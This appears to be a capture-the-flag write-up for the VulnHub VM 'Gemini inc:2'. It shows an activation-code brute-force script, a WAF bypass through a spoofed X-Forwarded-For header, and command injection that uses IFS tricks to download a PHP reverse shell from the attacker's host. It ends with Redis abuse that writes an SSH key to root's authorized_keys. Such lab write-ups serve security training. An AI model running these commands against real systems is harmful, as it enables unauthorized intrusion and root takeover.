@@ -1,0 +1,162 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Gemini inc:2 (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-gemini-inc2-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-09-27T06:56:32+00:00">September 27, 2018</time><time class="updated" datetime="2025-06-10T20:29:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello Friends!! Today we are going to breach a new VM lab “Gemini inc:2” of the vulnhub series and before moving ahead you can also take a  look over <span style="color: #3366ff;"><a style="color: #3366ff;" href="http://www.hackingarticles.in/hack-the-gemini-inc-ctf-challenge/">Gemini inc:1</a> </span>which we had solved earlier.</span></p>
+<p><span style="color: #000000;">Gemini Inc has contacted you to perform a penetration testing on one of their internal systems. This system has a web application that is meant for employees to export their profile to a PDF. Identify any vulnerabilities possible with the goal of complete system compromise with root privilege. To demonstrate the level of access obtained, please provide the content of flag.txt located in the root directory as proof.</span></p>
+<p><span style="color: #000000;">You can download it from here: https://www.vulnhub.com/entry/gemini-inc-2,234/</span></p>
+<p><span style="color: #000000;"><strong>Penetration Methodologies:</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
+<li><span style="color: #000000;">Obtaining Activation Code (Bash script)</span></li>
+<li><span style="color: #000000;">Web Directory Enumeration (Dirb)</span></li>
+<li><span style="color: #000000;">Bypass WAF (Burp Suite)</span></li>
+<li><span style="color: #000000;">Exploit Remote Code Execution</span></li>
+<li><span style="color: #000000;">Upload Reverse_ shell</span></li>
+<li><span style="color: #000000;">Obtain Reverse connection (Netcat)</span></li>
+<li><span style="color: #000000;">Abusing Redis for privilege escalation</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><u>WalkThrough</u></strong></span></p>
+<p><span style="color: #000000;">The first step is as always, running <strong>netdiscover </strong>on the VM to grab the IP address. In my case, the IP was <strong>192.168.1.103</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5tDjAOUePUs/W6x6Ygz97pI/AAAAAAAAagg/LDNQ71GR5785PM1QthwbT58MyvkLD7wHwCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Once the IP was found, we ran nmap aggressive scan to enumerate all the open ports.</span></p>
+<pre class="lang:default decode:true ">nmap –A 192.168.1.103</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-0_5yFxKEe6Y/W6x6a60IDOI/AAAAAAAAag8/s8uXWL1p6wAkWWOlgxKbcAEKRE7vEOq-QCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">From the nmap scan result, we found port 80 is open for HTTP service, let’s navigate to port 80 in the browser. It put up the Welcome Guest page for login into the web application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-S0MSxC5T4lI/W6x6cdGYy6I/AAAAAAAAahg/Wg-OTwbe3w0RshWMmJnmOlj9N7F_xxwxACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">When we didn’t find any remarkable clue from its home page, then without wasting much time, I use dirb for web directory enumeration and ran the following command for .php extension related files:</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.103 -X .php</pre>
+<p><span style="color: #000000;">Hmmm! I fetched some interesting URL, let’s inspect each one-by-one.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ImIH0Yq3pmM/W6x6c37rcpI/AAAAAAAAahk/z6S57fLcLock0_DFBZbCd1O3F625RbMFACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So further, we navigate to URL: <em>http://192.168.1.103/activate.php </em>and here observe the Activation Form that requires a User ID and Activation Code to activate the account.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-w3SAkCvTQj0/W6x6c4T9_tI/AAAAAAAAaho/maL-jGgd2Fo-HywTROKuo9JC2AL9rMjTgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Next, we navigate to URL: <em>http://192.168.1.103/registration.php</em> and here observe the Register Form to register a new account. So I registered for an account as “raaj”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C5vPHqbZ8O8/W6x6cxjZqOI/AAAAAAAAahs/nxjk0AraPVUqbn2SfiwJVWlHF5-8fUMeACLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">By registering as raaj, a new profile has been generated with <strong>User ID-14</strong> as highlighted in the below image but still, we need the 6-digit activation code to activate the user “raaj” account.</span></p>
+<p><span style="color: #000000;">To obtain an activation code, I try all possible Hit-Try method but all were a proof waste and at last, I found this <span style="color: #0000ff;">link</span> where I found a bash script for the activation code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HIliHXr45qk/W6x6dTjYP1I/AAAAAAAAahw/GflQJFJClOg9n0htPBWEnrqKNm7m2nFmgCLcBGAs/s1600/7.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">I copied the following code in a text file and save as <strong>gemini.sh </strong>on the Desktop. Script Source <strong><a href="https://github.com/Sayantan5/GeminiINC2">here</a></strong></span></p>
+<pre class="lang:default decode:true">#!/bin/bash
+url="http://192.168.1.103/activate.php"
+for key in {000000..999999}; do
+	token=$(curl -s -c cookie $url | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
+	resp=$(curl -s -w %{http_code} -b cookie --data "userid=14&amp;activation_code=$key&amp;token=${token}" $url | tail -n 1 | cut -d "&gt;" -f2)
+	if [ $resp -ne 403 ]; then
+		echo "Key = "$key
+		break
+	fi
+done</pre>
+<p><span style="color: #000000;">And at last, ran the bash script through the following command with user_id “14” to obtain the 6-digit activation code for user “raaj”.</span></p>
+<pre class="lang:default decode:true">bash gemini.sh</pre>
+<p><span style="color: #000000;">Awesome!! So we cracked the activation code “000511” for user “raaj”</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-IaAKlzYXO18/XD4Ny-ojMhI/AAAAAAAAcGA/I0NQCpkFbpwugJ04tX-bLbnSF5uhuyv1gCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">Now, submit your User_id and activated code to activate the account. In my case, my <strong>user_id is 14</strong> and the activation code is <strong>000511</strong> for user “<strong>raaj</strong>”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-B6NHvNfGaBA/W6x6dko5vfI/AAAAAAAAah4/HbyYvwXAoIkElTAUZyuydQf67qcrt-sDgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Great, I got login of raaj and then further I explored User List where I found all activated account of other users.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LdCdgf7HXMc/W6x6dxeO6NI/AAAAAAAAah8/XABd8Z9Ik4Ae3UfvaDfun_0OXDUf3KveQCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Then I check the profile of <strong>9emin1</strong> which was actually named as <strong>Gemini</strong> and here I found it is an administrator account.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JFxaAyjJK7U/W6x6Y2r3UwI/AAAAAAAAagc/674bUu2RRG0yMHbxmYA34tHW9a1Udg9ZQCLcBGAs/s1600/10.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">Then I check its source code where luckily I found the password hashes. I copied the hash value for its decryption.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dcEIg4_cKog/W6x6YyrwLQI/AAAAAAAAagk/fJqz7oJrboETMa74js1aCOIyp5gD-qeQQCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Then I use the online MD5 decryption for decrypting the hash value ‘<strong>edbd1887e772e13c251f688a5f10c1ffbb67960d</strong>’ and finally we obtain the plain text password “<strong>secretpassword</strong>”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RTegpYmGdvA/W6x6ZWnH28I/AAAAAAAAago/VOxxofPmu7wfyuPFHZs8vRPpA4sdih2GwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Then we login into the admin panel with the following credential:</span></p>
+<pre class="lang:default decode:true">Username: Gemini
+Password: secretpassword</pre>
+<p><span style="color: #000000;">Then navigate to <strong>Admin Panel -&gt; Execute Command</strong>. But it shows nothing.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-USghiWFbT8w/W6x6Zso5_-I/AAAAAAAAags/VsXC3oQYy3gtA2KHyzI8ljQAz6gOMlJfQCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">At that moment I used Burp suit for intercepting Http request and then further sent the intercepted request into a repeater to assured what kind of Response it is generating.</span></p>
+<p><span style="color: #000000;">Here I look at the HTTP traffic and perceive a <strong>403 IP NOT ALLOWED</strong> response. Hence proved the web application is running behind some kind of firewall.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-97isTu4jC5g/W6x6Z44-3mI/AAAAAAAAagw/eFI5H0-bNSU1Lbiy6zGYlKyAK-3RfzuQQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Then I Google to bypass WAF through burp suite extension and found a <a style="color: #000000;" href="https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c"><span style="color: #3366ff;">link</span></a> for “Bypass WAF”</span></p>
+<p><span style="color: #000000;">This extension adds headers to all Burp requests to bypass some WAF products. The following headers are automatically added to all requests:</span></p>
+<ol>
+<li><span style="color: #000000;">X-Originating-IP: 127.0.0.1</span></li>
+<li><span style="color: #000000;">X-Forwarded-For: 127.0.0.1</span></li>
+<li><span style="color: #000000;">X-Remote-IP: 127.0.0.1</span></li>
+<li><span style="color: #000000;">X-Remote-Addr: 127.0.0.1</span></li>
+</ol>
+<p><span style="color: #000000;">In our case, I use “<strong>X-Forwarded-For: 127.0.0.1</strong>” and then forward the intercepted HTTP request.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Knp3tLdtMVI/W6x6aLTAczI/AAAAAAAAag0/jJa-hQUbnNUAyK4F0JgdqmOxLVycMoFZQCLcBGAs/s1600/18.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Execute Command </strong></span></h3>
+<p><span style="color: #000000;">Finally, we got the Execute Command page, and it appears to be vulnerable to RCE where we can run system arbitrary command. Therefore, we try some malicious code such as “;ls” but again it’s shows nothing.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-n9HAJFYIP9s/W6x6aST4iuI/AAAAAAAAag4/h_dPuRbkaK401oIW51Qizx09mRIAo0WFgCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Here we need to fix X-Forwarded-For: 127.0.0.1 header for each page and to do so follow the below steps:</span></p>
+<ol>
+<li><span style="color: #000000;">Intercept the HTTP request of Execute Command page and <strong>go to Options</strong>.</span></li>
+<li><span style="color: #000000;">Explore <strong>Match and Replace</strong> setting then click to edit option to modify the request header.</span></li>
+<li><span style="color: #000000;">A small window will pop-up for Edit match/replace rule, here paste “<strong>X-Forwarded-For: 127.0.0.1</strong>” in the replace text field.</span></li>
+<li><span style="color: #000000;">Click on Ok and forward the intercepted request.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-N9SoB-Y7eUM/W6x6a2T9t_I/AAAAAAAAahA/WXupXdnFfLEAHWlpNzGE7nzj5WhjvRljgCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Now, we can easily exploit RCE vulnerability by uploading our php-reverse-shell. Traverse to the directory: <strong>/usr/share/webshells/php/php-reverse-shell.php;</strong> here I had modified the IP: 192.168.1.106 [kali IP] and listen port as 1234.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IE1Evd1ErLg/W6x6a5bbt9I/AAAAAAAAahE/c245K96HKzUNxrICPNlf4ELlhpON3UTMQCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Hey Guys!! You need to pay Attention here:</span></p>
+<p><span style="color: #000000;"><strong>NOTE:</strong> Be careful while executing any command that contains some arguments because <strong>here it is executing the command with argument and without spaces.</strong> So once again I took the help from Google and found a <a style="color: #000000;" href="https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces">link</a> for sending command with argument and without spaces.</span></p>
+<pre class="lang:default decode:true">IFS=:;a=wget:192.168.1.106/revshell.php:-O/tmp/revshell.php;$a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yr5uGwpmRsA/W6x6bUdNPpI/AAAAAAAAahI/TLy8RDKPbXAvyuv4Jd5NgPp2tArXgsNgwCLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Now type the following command to execute the uploaded backdoor file but before executing following command do not forget to start netcat listener.</span></p>
+<pre class="lang:default decode:true">IFS=:;a=php:/tmp/revshell.php;$a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VCtOhBaMvV4/W6x6bdvyHQI/AAAAAAAAahM/quWwg3BtU5UNv0Al8i0L4b3nueX7pkOBgCLcBGAs/s1600/23.png"/></span></p>
+<pre class="lang:default decode:true">nc –lvp 1234</pre>
+<p><span style="color: #000000;">Now, execute the following command to spawn proper tty shell of the target machine.</span></p>
+<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'
+lsb_release -a
+uname -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DDLnE_r3VyA/W6x6buT05KI/AAAAAAAAahQ/StYmYVeWjWQSf9t5MDHR1_5RnBSohdjaQCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Now, let’s go for the post-exploitation to obtain the root.txt file and for that, we need to escalated root privilege. First, we traverse to /home directory but didn’t find any valuable file, therefore, we try to enumerate running services with help of the following command.</span></p>
+<pre class="lang:default decode:true">netstat -antp</pre>
+<p><span style="color: #000000;">By executing the above command we enumerated the running services and found <strong>port 6379</strong> is used for <strong>Redis</strong>. And as we knew Redis is a key-value store, often referred to as a NoSQL database. The essence of a key-value store is the ability to store some data, called a value, inside a key. This data can later be retrieved only if we know the exact key used to store it.</span></p>
+<p><span style="color: #000000;">From source: <span style="color: #3366ff;">https://try.redis.io/</span></span></p>
+<p><span style="color: #000000;">Therefore, from its configuration file, we retrieved the auth key “<strong><em>8a7b86a2cd89d96dfcc125ebcc0535e6</em></strong>” so that we can extract information.</span></p>
+<pre class="lang:default decode:true">cd /etc/redis
+ls
+cat 6379.conf | grep requirepass
+redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 ping</pre>
+<p><span style="color: #000000;">Great!! So we got pong response, now let move ahead for extracting information inside it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mftxpX-j4Ik/W6x6bwuRNkI/AAAAAAAAahU/LY1PWmHdws4gqvFjoDxQVaCORvjzPoqgwCLcBGAs/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">Abusing Redis by writing malicious RSA keypair to the disk and for that, you can follow the given below steps and execute the command as described in the below steps.</span></p>
+<ol>
+<li><span style="color: #000000;">Generate a malicious RSA keypair with help of keygen.</span></li>
+</ol>
+<pre class="lang:default decode:true">ssh-keygen</pre>
+<ol start="2">
+<li><span style="color: #000000;">Prepare the public key by adding newlines with the help of the following command</span></li>
+</ol>
+<pre class="lang:default decode:true">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; public.txt</pre>
+<ol start="3">
+<li><span style="color: #000000;">Load the malicious public key into redis</span></li>
+</ol>
+<pre class="lang:default decode:true">cat public.txt | redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x set pub</pre>
+<ol start="4">
+<li><span style="color: #000000;">Set path to dump the content with the help of the following command</span></li>
+</ol>
+<pre class="lang:default decode:true">redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dir "/root/.ssh/"</pre>
+<ol start="5">
+<li><span style="color: #000000;">Configure the dbfilename as authorized_keys</span></li>
+</ol>
+<pre class="lang:default decode:true">redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dbfilename authorized_keys</pre>
+<ol start="6">
+<li><span style="color: #000000;">Save the configuration and exit.</span></li>
+</ol>
+<pre class="lang:default decode:true">redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yywZqe6Bav8/W6x6cOl3w2I/AAAAAAAAahY/F7kwqOLFI9QlHvVXSp7ckulTv-1_n4lPgCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Authenticate via SSH.</span></p>
+<pre class="lang:default decode:true">cd .ssh
+ssh root@127.0.0.1</pre>
+<p><span style="color: #000000;">Boom!!! We got root access now let’s grab the flag.txt file to finish this challenge completely.</span></p>
+<pre class="lang:default decode:true">ls
+cat flag.txt</pre>
+<p><span style="color: #000000;">Yuppie!!! Happy Hacking 😉</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-34V77pZvAbY/W6x6cOUGa7I/AAAAAAAAahc/kx_pe03832UK0SSJuuLDi9cFPS4JVIyFQCLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
